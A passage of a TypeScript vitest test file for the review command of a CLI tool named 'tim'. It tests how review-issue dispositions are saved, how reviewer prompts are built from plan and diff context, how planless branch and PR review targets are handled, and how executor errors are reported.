  vi.mocked(contextGatheringModule.gatherPlanContext).mockImplementation(gatherPlanContextMock);

  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
  vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
  vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);

  // Test resolving plan by ID
  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand(42, {}, mockCommand);
  expect(gatherPlanContextMock).toHaveBeenCalledTimes(1);
});

test('uses review default executor from config when no executor option passed', async () => {
  await writePlanToDb(
    {
      id: 1,
      title: 'Review Executor Test',
      goal: 'Use review default executor',
      tasks: [
        {
          title: 'Task',
          description: 'Review task',
        },
      ],
    },
    { cwdForIdentity: testDir }
  );

  const mockExecutor = {
    execute: vi.fn(async () =>
      JSON.stringify({
        issues: [],
        recommendations: [],
        actionItems: [],
      })
    ),
  };

  vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
    createMockPlanContext({
      resolvedPlanFile: 'plan.yml',
      planData: {
        id: 1,
        title: 'Review Executor Test',
        goal: 'Use review default executor',
        tasks: [
          {
            title: 'Task',
            description: 'Review task',
          },
        ],
      },
      parentChain: [],
      completedChildren: [],
      diffResult: {
        hasChanges: true,
        changedFiles: ['src/test.ts'],
        baseBranch: 'main',
        diffContent: 'diff',
      },
    }) as any
  );

  vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
    defaultExecutor: 'codex-cli',
    review: {
      defaultExecutor: 'codex-cli',
    },
  } as any);

  vi.mocked(executorsModule.buildExecutorAndLog).mockImplementation((executorName: string) => {
    expect(executorName).toBe('codex-cli');
    return mockExecutor as any;
  });

  vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
    prompt: 'mock review prompt',
  } as any);

  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
  vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('hash');
  vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
  vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);

  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand(1, { noSave: true }, mockCommand);

  expect(mockExecutor.execute).toHaveBeenCalledTimes(1);
});

describe('persistReviewIssueDisposition union variants', () => {
  test('a none disposition performs no plan write', async () => {
    await writePlanToDb(
      {
        id: 700,
        title: 'None disposition no-op',
        goal: 'A none disposition must not touch the plan file',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            id: 'pre-existing',
            severity: 'minor',
            category: 'style',
            content: 'An untouched saved issue',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    const beforePlan = (await resolvePlanByNumericId(700, testDir)).plan;

    await expect(persistReviewIssueDisposition(700, { kind: 'none' }, testDir)).resolves.toEqual({
      appendedTaskCount: 0,
      issuesSavedCount: 0,
      issuesResolvedCount: 0,
    });

    const afterPlan = (await resolvePlanByNumericId(700, testDir)).plan;
    expect(afterPlan.reviewIssues).toEqual(beforePlan.reviewIssues);
    expect(afterPlan.tasks).toEqual(beforePlan.tasks);
    // No routed write happened at all: updatedAt must not have moved.
    expect(afterPlan.updatedAt).toEqual(beforePlan.updatedAt);
  });

  test('an append disposition applies its three effects atomically in one write', async () => {
    const preExistingMatch = {
      id: 'pre-open-to-resolve',
      severity: 'minor' as const,
      category: 'style' as const,
      content: 'Inconsistent naming',
      file: 'src/app.ts',
      line: 20,
    };
    const preExistingUnrelated = {
      id: 'pre-open-untouched',
      severity: 'info' as const,
      category: 'other' as const,
      content: 'An unrelated saved issue',
      file: 'src/other.ts',
      line: 1,
    };

    await writePlanToDb(
      {
        id: 701,
        title: 'Append disposition atomicity',
        goal: 'One append disposition should append, save, and resolve together',
        details: 'Details',
        tasks: [],
        reviewIssues: [preExistingMatch, preExistingUnrelated],
      },
      { cwdForIdentity: testDir }
    );

    const taskToAppend = {
      id: 'blocking-finding',
      severity: 'major' as const,
      category: 'bug' as const,
      content: 'Missing null check causes a crash',
      file: 'src/app.ts',
      line: 10,
    };
    const issueToSave = {
      id: 'non-blocking-finding',
      severity: 'minor' as const,
      category: 'style' as const,
      content: 'A fresh non-blocking finding',
      file: 'src/fresh.ts',
      line: 5,
    };
    const issueToResolve = {
      id: 'new-review-run-id',
      severity: 'minor' as const,
      category: 'style' as const,
      content: 'Inconsistent naming',
      file: 'src/app.ts',
      line: 20,
    };

    const result = await persistReviewIssueDisposition(
      701,
      {
        kind: 'append',
        tasksToAppend: [taskToAppend],
        issuesToSave: [issueToSave],
        issuesToResolve: [issueToResolve],
      },
      testDir
    );

    expect(result).toEqual({
      appendedTaskCount: 1,
      issuesSavedCount: 1,
      issuesResolvedCount: 1,
    });

    const updatedPlan = (await resolvePlanByNumericId(701, testDir)).plan;
    expect(updatedPlan.tasks.some((t) => t.title.includes('Missing null check'))).toBe(true);
    // The pre-existing matching issue was resolved (removed by identity), the unrelated one
    // survived untouched, and the freshly saved non-blocking finding was added.
    expect(updatedPlan.reviewIssues).toEqual([
      expect.objectContaining({ id: 'pre-open-untouched' }),
      expect.objectContaining({ content: 'A fresh non-blocking finding' }),
    ]);
  });

  test('a clear disposition drops open saved issues but keeps the rejected ledger', async () => {
    const rejectedIssue = {
      id: 'rejected-keep',
      severity: 'major' as const,
      category: 'bug' as const,
      content: 'A previously rejected finding',
      rejected: true,
      rejectedReason: 'Intentional',
      rejectedAt: '2026-08-03T12:00:00.000Z',
    };
    const openIssue = {
      id: 'open-clear-me',
      severity: 'minor' as const,
      category: 'style' as const,
      content: 'A stale open finding',
    };

    await writePlanToDb(
      {
        id: 702,
        title: 'Clear disposition keeps ledger',
        goal: 'A clear disposition should drop open issues but keep rejections',
        details: 'Details',
        tasks: [],
        reviewIssues: [rejectedIssue, openIssue],
      },
      { cwdForIdentity: testDir }
    );

    await expect(persistReviewIssueDisposition(702, { kind: 'clear' }, testDir)).resolves.toEqual({
      appendedTaskCount: 0,
      issuesSavedCount: 0,
      issuesResolvedCount: 0,
    });

    const updatedPlan = (await resolvePlanByNumericId(702, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([rejectedIssue]);
  });

  test('an unknown disposition kind throws instead of silently doing nothing', async () => {
    await writePlanToDb(
      {
        id: 703,
        title: 'Unknown disposition kind',
        goal: 'An invalid disposition kind must throw, not silently no-op',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    await expect(
      persistReviewIssueDisposition(
        703,
        { kind: 'bogus' } as unknown as ReviewIssueDisposition,
        testDir
      )
    ).rejects.toThrow('Unknown review issue disposition kind: bogus');
  });
});

describe('generateDiffForReview', () => {
  test('function exists and can be called', async () => {
    // Since mocking the Bun $ utility is complex in tests, we'll test that the function
    // exists and has the expected interface, then test the full functionality in integration tests
    const gitRepoDir = await mkdtemp(join(tmpdir(), 'tim-git-test-'));

    // Mock git utilities to avoid actual git calls
    vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
    vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);

    // Test that the function exists and has the expected structure
    expect(typeof generateDiffForReview).toBe('function');

    // The function should handle the case when git commands fail gracefully
    try {
      await generateDiffForReview(gitRepoDir);
    } catch (error) {
      // Should throw a meaningful error if git commands fail
      expect(error.message).toContain('Failed to generate');
    }
  });

  test('function interface with jj', async () => {
    const jjRepoDir = await mkdtemp(join(tmpdir(), 'tim-jj-test-'));

    vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
    vi.mocked(gitModule.getUsingJj).mockResolvedValue(true);

    // Test that the function exists and handles jj mode
    expect(typeof generateDiffForReview).toBe('function');

    try {
      await generateDiffForReview(jjRepoDir);
    } catch (error) {
      // Should throw a meaningful error if jj commands fail
      expect(error.message).toContain('Failed to generate');
    }
  });
});

describe('buildReviewPrompt', () => {
  test('includes plan context and diff content', async () => {
    const planData: PlanSchema = {
      id: 42,
      title: 'Test Feature Implementation',
      goal: 'Implement a new test feature for the application',
      details: 'This feature should handle user authentication and data validation',
      tasks: [
        {
          title: 'Add authentication',
          description: 'Implement user login/logout functionality',
          done: false,
        },
        {
          title: 'Add data validation',
          description: 'Validate user input',
          done: false,
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/auth.ts', 'src/validation.ts'],
      baseBranch: 'main',
      diffContent: `diff --git a/src/auth.ts b/src/auth.ts
index 1234567..abcdefg 100644
--- a/src/auth.ts
+++ b/src/auth.ts
@@ -1,3 +1,6 @@
 export class Auth {
+  login(user: string) {
+    return true;
+  }
 }`,
    };

    // Mock the reviewer prompt
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          name: 'reviewer',
          description: 'Reviews code',
          prompt: `REVIEWER AGENT\n\n${contextContent}\n\nPLEASE REVIEW THE CODE`,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    // Verify plan context is included
    expect(prompt).toContain('Plan ID:** 42');
    expect(prompt).toContain('Title:** Test Feature Implementation');
    expect(prompt).toContain('Goal:** Implement a new test feature');
    expect(prompt).toContain('Details:**');
    expect(prompt).toContain('This feature should handle user authentication');

    // Verify tasks are included
    expect(prompt).toContain('Tasks:**');
    expect(prompt).toContain('1. **Add authentication**');
    expect(prompt).toContain('Implement user login/logout functionality');
    expect(prompt).toContain('2. **Add data validation**');

    // Verify diff content is included
    expect(prompt).toContain('Diff Base:** main');
    expect(prompt).toContain('Changed Files (2):**');
    expect(prompt).toContain('- src/auth.ts');
    expect(prompt).toContain('- src/validation.ts');
    expect(prompt).toContain('diff --git a/src/auth.ts');
    expect(prompt).toContain('+  login(user: string)');

    // Verify review instructions are included
    expect(prompt).toContain('Review Instructions');
    expect(prompt).toContain('Compliance with Plan Requirements');
    expect(prompt).toContain('Code Quality');
    expect(prompt).toContain('REVIEWER AGENT');
  });

  test('includes previous review response when provided', async () => {
    const planData: PlanSchema = {
      id: 7,
      title: 'Previous Review Response Test',
      goal: 'Ensure previous review response is included',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/example.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git a/src/example.ts b/src/example.ts',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          name: 'reviewer',
          description: 'Reviews code',
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      undefined,
      undefined,
      undefined,
      'Resolved the missing edge cases in the last review.'
    );

    expect(prompt).toContain('Previous Review Response');
    expect(prompt).toContain('Resolved the missing edge cases in the last review.');
  });

  test('includes review scope note when provided', async () => {
    const planData: PlanSchema = {
      id: 7,
      title: 'Scoped Review Plan',
      goal: 'Check scope note',
      tasks: [{ title: 'Task One', description: 'Only task', done: false }],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/file.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(
      planData,
      diffResult,
      false,
      false,
      [],
      [],
      undefined,
      'Scoped to selected tasks.'
    );

    expect(prompt).toContain('**Review Scope:** Scoped to selected tasks.');
  });

  test('passes useSubagents flag to reviewer prompt', async () => {
    const planData: PlanSchema = {
      id: 99,
      title: 'Subagent Plan',
      goal: 'Check subagent usage',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/file.ts'],
      baseBranch: 'main',
      diffContent: 'diff --git',
    };

    const reviewerSpy = vi.fn(() => ({ prompt: 'mock prompt' }));
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(reviewerSpy);

    buildReviewPrompt(planData, diffResult, false, true, [], []);

    expect(reviewerSpy).toHaveBeenCalledTimes(1);
    expect(reviewerSpy).toHaveBeenCalledWith(
      expect.any(String),
      planData.id,
      undefined,
      undefined,
      true,
      false,
      undefined,
      false
    );
  });

  test('handles plan without tasks', async () => {
    const planData: PlanSchema = {
      id: 1,
      title: 'Simple Plan',
      goal: 'A simple goal',
      tasks: [],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['src/simple.ts'],
      baseBranch: 'main',
      diffContent: 'diff content here',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    expect(prompt).toContain('Plan ID:** 1');
    expect(prompt).toContain('Title:** Simple Plan');
    expect(prompt).toContain('Goal:** A simple goal');
    expect(prompt).not.toContain('Details:**');
    expect(prompt).toContain('src/simple.ts');
  });

  test('handles plan without details', async () => {
    const planData: PlanSchema = {
      id: 2,
      title: 'Plan Without Details',
      goal: 'Test goal',
      tasks: [
        {
          title: 'Task 1',
          description: 'Description 1',
          steps: [],
        },
      ],
    };

    const diffResult = {
      hasChanges: true,
      changedFiles: ['test.ts'],
      baseBranch: 'master',
      diffContent: 'test diff',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, true, false, [], []);

    expect(prompt).toContain('Plan ID:** 2');
    expect(prompt).toContain('Title:** Plan Without Details');
    expect(prompt).toContain('Goal:** Test goal');
    expect(prompt).not.toContain('Details:**');
    expect(prompt).toContain('1. **Task 1**');
    expect(prompt).toContain('Description 1');
    expect(prompt).toContain('Diff Base:** master');
  });

  test('uses originalIndex for task numbering when tasks have originalIndex', async () => {
    // Tasks with originalIndex simulate filtered/scoped tasks
    const planData: PlanSchema = {
      id: 10,
      title: 'Scoped Review Plan',
      goal: 'Test original index display',
      tasks: [
        { title: 'Task Two', description: 'Second task', done: false, originalIndex: 2 } as any,
        { title: 'Task Five', description: 'Fifth task', done: true, originalIndex: 5 } as any,
      ],
    };

    const diffResult: DiffResult = {
      diffContent: 'test diff',
      changedFiles: ['file1.ts'],
      baseBranch: 'main',
    };

    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          prompt: contextContent,
        }) as any
    );

    const prompt = buildReviewPrompt(planData, diffResult, false, false, [], []);

    // Should use original indexes (2 and 5), not array indexes (1 and 2)
    expect(prompt).toContain('2. **Task Two**');
    expect(prompt).toContain('5. **Task Five**');
    expect(prompt).not.toContain('1. **Task Two**');
    expect(prompt).not.toContain('2. **Task Five**');
  });

  test('adds no-checks guidance when invoked from autoreview', () => {
    const originalAutoreview = process.env.TIM_AUTOREVIEW;
    process.env.TIM_AUTOREVIEW = '1';
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          name: 'reviewer',
          description: 'Reviews code',
          prompt: contextContent,
        }) as any
    );

    try {
      const prompt = buildReviewPrompt(
        {
          id: 42,
          title: 'Autoreview Prompt',
          goal: 'Review without rerunning checks',
          tasks: [],
        },
        {
          hasChanges: true,
          changedFiles: ['src/example.ts'],
          baseBranch: 'main',
          diffContent: 'diff --git a/src/example.ts b/src/example.ts',
        },
        false,
        false,
        [],
        []
      );

      expect(prompt).toContain('Check Assumptions');
      expect(prompt).toContain('Do not run tests, type checking, linting, formatting');
      expect(prompt).toContain('Assume automated checks pass');
    } finally {
      if (originalAutoreview === undefined) {
        delete process.env.TIM_AUTOREVIEW;
      } else {
        process.env.TIM_AUTOREVIEW = originalAutoreview;
      }
    }
  });
});

describe('buildPlanlessReviewPrompt', () => {
  beforeEach(() => {
    vi.mocked(agentPromptsModule.getReviewerPrompt).mockImplementation(
      (contextContent: string) =>
        ({
          name: 'reviewer',
          description: 'Reviews code',
          prompt: contextContent,
        }) as any
    );
  });

  function createPlanlessDiff(overrides: Partial<DiffResult> = {}): DiffResult {
    return {
      hasChanges: true,
      changedFiles: ['src/review.ts', 'src/review.test.ts'],
      baseBranch: 'main',
      mergeBaseCommit: 'abc123',
      diffContent: `diff --git a/src/review.ts b/src/review.ts
@@ -1 +1,2 @@
+export const changed = true;`,
      ...overrides,
    };
  }

  test('includes current target metadata and excludes plan context', () => {
    const prompt = buildPlanlessReviewPrompt(
      {
        kind: 'current',
        repoRoot: '/repo',
        currentBranch: 'feature/current-review',
        baseBranch: 'main',
        worktreePath: '/repo',
      },
      createPlanlessDiff(),
      '/repo',
      false,
      false,
      undefined,
      undefined
    );

    expect(prompt).toContain('# Review Target');
    expect(prompt).toContain('**Target Kind:** current');
    expect(prompt).toContain('**Current Branch:** feature/current-review');
    expect(prompt).toContain('**Base Branch:** main');
    expect(prompt).toContain('origin/main');
    expect(prompt).toContain('main@origin');
    expect(prompt).toContain('not associated with a tim plan');
    expect(prompt).toContain('Findings are ephemeral');
    expect(prompt).toContain('- src/review.ts');
    expect(prompt).toContain('- src/review.test.ts');
    expect(prompt).not.toContain('Plan Context');
    expect(prompt).not.toContain('Plan Hierarchy');
    expect(prompt).not.toContain('Plan Tasks');
    expect(prompt).not.toContain('Plan Progress');
    expect(prompt).not.toContain('saved issue');
    expect(prompt).not.toContain('Check Assumptions');
  });

  test('adds no-checks guidance for planless reviews invoked from autoreview', () => {
    const originalAutoreview = process.env.TIM_AUTOREVIEW;
    process.env.TIM_AUTOREVIEW = '1';

    try {
      const prompt = buildPlanlessReviewPrompt(
        {
          kind: 'current',
          repoRoot: '/repo',
          currentBranch: 'feature/current-review',
          baseBranch: 'main',
          worktreePath: '/repo',
        },
        createPlanlessDiff(),
        '/repo',
        false,
        false,
        undefined,
        undefined
      );

      expect(prompt).toContain('Check Assumptions');
      expect(prompt).toContain('Do not run tests, type checking, linting, formatting');
      expect(prompt).toContain('Assume automated checks pass');
    } finally {
      if (originalAutoreview === undefined) {
        delete process.env.TIM_AUTOREVIEW;
      } else {
        process.env.TIM_AUTOREVIEW = originalAutoreview;
      }
    }
  });

  test('includes branch target requested branch and base', () => {
    const prompt = buildPlanlessReviewPrompt(
      {
        kind: 'branch',
        repoRoot: '/repo',
        requestedBranch: 'feature/review-target',
        baseBranch: 'release/base',
      },
      createPlanlessDiff({ baseBranch: 'release/base' }),
      '/repo/.tim/workspaces/feature-review-target',
      false,
      false,
      undefined,
      undefined
    );

    expect(prompt).toContain('**Target Kind:** branch');
    expect(prompt).toContain('**Requested Branch:** feature/review-target');
    expect(prompt).toContain('**Base Branch:** release/base');
    expect(prompt).toContain('origin/release/base');
    expect(prompt).toContain('release/base@origin');
  });

  test('includes PR target metadata', () => {
    const target: PullRequestReviewTarget = {
      kind: 'pr',
      repoRoot: '/repo',
      canonicalPrUrl: 'https://github.com/acme/review-tests/pull/123',
      prNumber: 123,
      title: 'Add planless review',
      owner: 'acme',
      repo: 'review-tests',
      baseBranch: 'main',
      headBranch: 'feature/planless-review',
      headSha: 'deadbeef',
      prStatusId: 44,
      prStatus: {
        id: 44,
        pr_url: 'https://github.com/acme/review-tests/pull/123',
        owner: 'acme',
        repo: 'review-tests',
        pr_number: 123,
        author: 'octocat',
        title: 'Add planless review',
        state: 'OPEN',
        draft: 0,
        mergeable: 'MERGEABLE',
        head_sha: 'deadbeef',
        base_branch: 'main',
        head_branch: 'feature/planless-review',
        requested_reviewers: null,
        review_decision: null,
        check_rollup_state: null,
        merged_at: null,
        additions: 4,
        deletions: 2,
        changed_files: 2,
        pr_updated_at: null,
        latest_commit_pushed_at: null,
        ready_at: null,
        last_fetched_at: '2026-06-05T00:00:00.000Z',
        created_at: '2026-06-05T00:00:00.000Z',
        updated_at: '2026-06-05T00:00:00.000Z',
      },
    };

    const prompt = buildPlanlessReviewPrompt(
      target,
      createPlanlessDiff(),
      '/repo/.tim/workspaces/pr-123',
      false,
      false,
      undefined,
      undefined
    );

    expect(prompt).toContain('**Target Kind:** pr');
    expect(prompt).toContain('**PR URL:** https://github.com/acme/review-tests/pull/123');
    expect(prompt).toContain('**PR Number:** #123');
    expect(prompt).toContain('**PR Title:** Add planless review');
    expect(prompt).toContain('**Repository:** acme/review-tests');
    expect(prompt).toContain('**Head Branch:** feature/planless-review');
    expect(prompt).toContain('**Head SHA:** deadbeef');
    expect(prompt).toContain('**Base Branch:** main');
  });

  test('appends full diff when requested', () => {
    const prompt = buildPlanlessReviewPrompt(
      {
        kind: 'current',
        repoRoot: '/repo',
        currentBranch: 'feature/current-review',
        baseBranch: 'main',
        worktreePath: '/repo',
      },
      createPlanlessDiff(),
      '/repo',
      true,
      false,
      undefined,
      undefined
    );

    expect(prompt).toContain('**Full Diff:**');
    expect(prompt).toContain('```diff');
    expect(prompt).toContain('diff --git a/src/review.ts b/src/review.ts');
    expect(prompt).toContain('+export const changed = true;');
  });
});

describe('handleReviewCommand error handling', () => {
  test('throws error when plan cannot be loaded', async () => {
    vi.mocked(contextGatheringModule.gatherPlanContext).mockRejectedValue(
      new Error('Plan not found: 999')
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(999, {}, mockCommand)).rejects.toThrow('Plan not found');
  });

  test('exits early when no changes detected', async () => {
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '1',
        planData: {
          id: 1,
          title: 'Test Plan',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: false,
          changedFiles: [],
          baseBranch: 'main',
          diffContent: '',
        },
        incrementalSummary: null,
        noChangesDetected: true,
      }) as any
    );

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    // Should complete without error but not call executor
    await expect(handleReviewCommand(1, {}, mockCommand)).resolves.toEqual({
      tasksAppended: 0,
      issuesSaved: 0,
    });
  });

  test('review --issues treats a plan with only rejected findings as empty', async () => {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '43',
        planData: {
          id: 43,
          title: 'Only rejected findings',
          goal: 'Do not offer rejected findings as an open review queue',
          tasks: [],
          reviewIssues: [
            {
              severity: 'major',
              category: 'bug',
              content: 'An already rejected finding.',
              rejected: true,
              rejectedReason: 'Intentional behavior.',
              rejectedAt: '2026-08-03T12:00:00.000Z',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/example.ts'],
          baseBranch: 'main',
          diffContent: 'diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const consoleLogSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      await expect(
        handleReviewCommand(43, { issues: true, print: true }, { parent: { opts: () => ({}) } })
      ).resolves.toEqual({ tasksAppended: 0, issuesSaved: 0 });
      expect(consoleLogSpy).not.toHaveBeenCalled();
    } finally {
      consoleLogSpy.mockRestore();
    }
  });

  test('review --issues reports the rejection-only message, singular and plural', async () => {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);

    const makePlanContext = (id: number, rejectedCount: number) =>
      createMockPlanContext({
        resolvedPlanFile: String(id),
        planData: {
          id,
          title: 'Only rejected findings',
          goal: 'Report the rejection ledger instead of claiming no issues exist',
          tasks: [],
          reviewIssues: Array.from({ length: rejectedCount }, (_, index) => ({
            severity: 'major' as const,
            category: 'bug',
            content: `Rejected finding ${index + 1}.`,
            rejected: true,
            rejectedReason: 'Intentional behavior.',
            rejectedAt: '2026-08-03T12:00:00.000Z',
          })),
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/example.ts'],
          baseBranch: 'main',
          diffContent: 'diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any;

    const logSpy = vi.mocked(loggingModule.log);

    // Singular: exactly one rejected entry.
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValueOnce(
      makePlanContext(45, 1)
    );
    logSpy.mockClear();
    await handleReviewCommand(45, { issues: true }, { parent: { opts: () => ({}) } });
    const singularOutput = logSpy.mock.calls.map(([message]) => String(message)).join('\n');
    expect(singularOutput).toContain(
      'No open saved review issues for this plan. 1 rejected entry remains on the plan'
    );
    expect(singularOutput).toContain('tim review-issues list 45');
    expect(singularOutput).not.toContain('entries remain');

    // Plural: more than one rejected entry.
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValueOnce(
      makePlanContext(46, 2)
    );
    logSpy.mockClear();
    await handleReviewCommand(46, { issues: true }, { parent: { opts: () => ({}) } });
    const pluralOutput = logSpy.mock.calls.map(([message]) => String(message)).join('\n');
    expect(pluralOutput).toContain(
      'No open saved review issues for this plan. 2 rejected entries remain on the plan'
    );
    expect(pluralOutput).toContain('tim review-issues list 46');
  });

  test('review --issues reports the original no-issues message when nothing was ever saved', async () => {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '47',
        planData: {
          id: 47,
          title: 'No saved issues at all',
          goal: 'Keep the original message when there is nothing rejected either',
          tasks: [],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/example.ts'],
          baseBranch: 'main',
          diffContent: 'diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const logSpy = vi.mocked(loggingModule.log);
    logSpy.mockClear();
    await handleReviewCommand(47, { issues: true }, { parent: { opts: () => ({}) } });
    const output = logSpy.mock.calls.map(([message]) => String(message)).join('\n');
    expect(output).toContain('No saved review issues found for this plan.');
    expect(output).not.toContain('rejected entr');
  });

  test('review --issues --print emits only open findings', async () => {
    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({} as any);
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '44',
        planData: {
          id: 44,
          title: 'Mixed review findings',
          goal: 'Print only the open portion of the saved review queue',
          tasks: [],
          reviewIssues: [
            {
              severity: 'major',
              category: 'bug',
              content: 'Do not print this rejected finding.',
              rejected: true,
              rejectedReason: 'Intentional behavior.',
              rejectedAt: '2026-08-03T12:00:00.000Z',
            },
            {
              severity: 'minor',
              category: 'testing',
              content: 'Print this open finding.',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/example.ts'],
          baseBranch: 'main',
          diffContent: 'diff',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const consoleLogSpy = vi.spyOn(console, 'log').mockImplementation(() => {});
    try {
      await handleReviewCommand(
        44,
        { issues: true, print: true },
        { parent: { opts: () => ({}) } }
      );
      expect(consoleLogSpy).toHaveBeenCalledTimes(1);
      const printed = JSON.parse(String(consoleLogSpy.mock.calls[0]?.[0])) as Array<{
        content: string;
      }>;
      expect(printed).toEqual([
        { severity: 'minor', category: 'testing', content: 'Print this open finding.' },
      ]);
    } finally {
      consoleLogSpy.mockRestore();
    }
  });

  test('handles executor execution failure', async () => {
    const planFile = join(testDir, 'executor-fail.yml'); // only used in mock context
    await writePlanToDb(
      {
        id: 126,
        title: 'Test No Issues',
        goal: 'Test goal',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    const mockExecutor = {
      execute: vi.fn(async () => {
        throw new Error('Executor failed');
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'codex-cli',
    } as any);

    vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue(mockExecutor as any);

    vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
    vi.mocked(gitModule.getCurrentCommitHash).mockResolvedValue('deadbeef');

    // Avoid real context gathering that would hit git/FS
    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '126',
        planData: {
          id: 126,
          title: 'Test No Issues',
          goal: 'Test goal',
          tasks: [
            {
              title: 'Test task',
              description: 'A test task',
            },
          ],
        },
        parentChain: [],
        completedChildren: [],
        diffResult: {
          hasChanges: true,
          changedFiles: ['src/test.ts'],
          baseBranch: 'main',
          diffContent: 'mock diff content',
        },
        incrementalSummary: null,
        noChangesDetected: false,
      }) as any
    );

    const mockCommand = {
      parent: {
        opts: () => ({}),
      },
    };

    await expect(handleReviewCommand(126, {}, mockCommand)).rejects.toThrow(
      'Review execution failed'
    );
  });
});

describe('integration with executor system', () => {
  test('passes correct parameters to executor', async () => {
    await writePlanToDb(
      {
        id: 123,
        title: 'Integration Test Plan',
        goal: 'Test executor integration',
        tasks: [
          {
            title: 'Test task',
            description: 'Integration test task',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    const mockExecutor = {
      execute: vi.fn(async (prompt: string, metadata: any) => {
        expect(prompt).toContain('REVIEWER AGENT');
        expect(metadata.planTitle).toBe('Integration Test Plan');
        return JSON.stringify({
          issues: [],
          recommendations: [],
          actionItems: [],
        });
      }),
    };

    vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
      defaultExecutor: 'claude-code',
    } as any);

    vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
      createMockPlanContext({
        resolvedPlanFile: '123',
        planData: {
          id: 123,
          title: 'Integration Test Plan',
          goal: 'Test executor integration',
